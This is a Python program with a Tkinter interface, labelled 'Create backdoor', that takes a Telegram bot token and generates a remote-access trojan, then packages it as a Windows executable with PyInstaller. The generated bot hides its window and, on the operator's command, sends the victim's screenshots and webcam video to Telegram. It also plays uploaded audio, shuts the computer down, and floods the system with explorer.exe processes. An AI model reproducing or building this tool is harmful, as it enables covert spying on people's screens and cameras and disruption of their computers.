from tkinter import *
from tkinter import messagebox
import os
import subprocess
from tkinter import Tk

script_name = "bot.py"
# filetoexe

def create_exe():
  subprocess.run([
      "pyinstaller",
      "--onefile",
      "--hidden-import=pygame",
      "--hidden-import=pyautogui",
      "--hidden-import=telebot",
      script_name
  ])
  processEXE['text'] = 'hello'


  #subprocess.run(command)
# Создаем функцию, которая формирует long_text 
# после того, как будет получен TOKEN
def create_long_text(token):
    return f"""
import os
import shutil
import ctypes
import telebot
from io import BytesIO
from PIL import Image
from time import sleep
import cv2
import subprocess
import pygame
import pyautogui

def hide_window():
  ctypes.windll.user32.ShowWindow(ctypes.windll.user32.GetForegroundWindow(), 0)

if __name__ == "main":
  hide_window()

bot = telebot.TeleBot('{token}')

@bot.message_handler(commands=['start'])
def start(message): 
  bot.send_message(message.chat.id, '== list commands ==')
  bot.send_message(message.chat.id, '== screen, webcam, ddos, music, poweroff ==')
  bot.send_message(message.chat.id, 'botversion 0.0.2')

@bot.message_handler(commands=['screen'])
def screen(message):
  screenshot = pyautogui.screenshot()

  buffer = BytesIO()
  screenshot.save(buffer, 'PNG')
  buffer.seek(0)

  bot.send_photo(message.chat.id, buffer)

@bot.message_handler(commands=['webcam'])
def webcam(message):
  cap = cv2.VideoCapture(0) 
  out = cv2.VideoWriter('output.mp4', cv2.VideoWriter_fourcc(*'XVID'), 20.0, (1080, 720))

  for i in range(200):  
    ret, frame = cap.read()
    if ret:
      out.write(frame)
      sleep(0.05)

  cap.release()
  out.release()

  with open("output.mp4", "rb") as f:
    video_bytes = f.read()
  video_io = BytesIO(video_bytes)
  sleep(4)

  bot.send_video(message.chat.id, video_io)

@bot.message_handler(commands=['ddos'])
def ddos(message):  
  bot.send_message(message.chat.id, '# DDoS is started')
  sleep(3)
  bot.send_message(message.chat.id, '[+] Shikata_ga_nai')
  while True:
    subprocess.run(["explorer.exe"]) 

@bot.message_handler(content_types=["audio"])
def music(message):
  file_info = bot.get_file(message.audio.file_id)

  downloaded_file = bot.download_file(file_info.file_path)
  out_file_name = f"music.mp3"

  with open(out_file_name, 'wb') as f:
    f.write(downloaded_file)

  pygame.init()

  pygame.mixer.music.load(out_file_name)

  pygame.mixer.music.play()

  while pygame.mixer.music.get_busy():
    pass

  pygame.mixer.music.stop()
  pygame.quit()

  bot.send_message(message.chat.id, "working")

@bot.message_handler(commands=['poweroff'])
def poweroff(message):
  bot.send_message(message.chat.id, "Выключение компьютера...")
  subprocess.run(['shutdown', '/s', '/t', '0'])

bot.infinity_polling()
"""


# commands

def clickmainmenuButton():
    global TOKEN  # Используем глобальную переменную TOKEN
    TOKEN = token.get()  # Получаем текст из поля ввода
    print(f">> Bot token {TOKEN}")

    # Замените эту строку на ваш код для создания бэкдора
    newbackdoor = open("bot.py", "w")
    newbackdoor.write(create_long_text(TOKEN)) # Используем функцию для создания текста
    newbackdoor.close()

    # ... остальной код для создания бэкдора ...

    # path = os.path.join(os.path.abspath(os.path.dirname(file)))
    path = os.getcwd()

    print(path)


root = Tk()

root['bg'] = '#2F4F4F'

root.title("MAIN")
root.geometry("400x270")
root.resizable(width=False, height=False)
# root.wm_attributes('-beta', 0.7)

title = Label(root, text='Create backdoor > take your Bot token', font=24, bg='red')
buttonEnter = Button(
    text='enter', font=3, bg='green', command=clickmainmenuButton, width=31, height=1
)
token = Entry(root, width=30, bg='grey')
buttonEXE = Button(root, text='build exe', font=3, bg='red', heigh=1, width=31, command=create_exe)
processEXE = Label(root, text='', bg='grey', width=30, height=2)


# draw window
title.pack(pady=(5, 0))
token.pack(pady=(20, 0))
buttonEnter.pack(pady=(25, 0))
buttonEXE.pack(pady=(26, 0))
processEXE.pack(pady=(27, 0))
root.mainloop()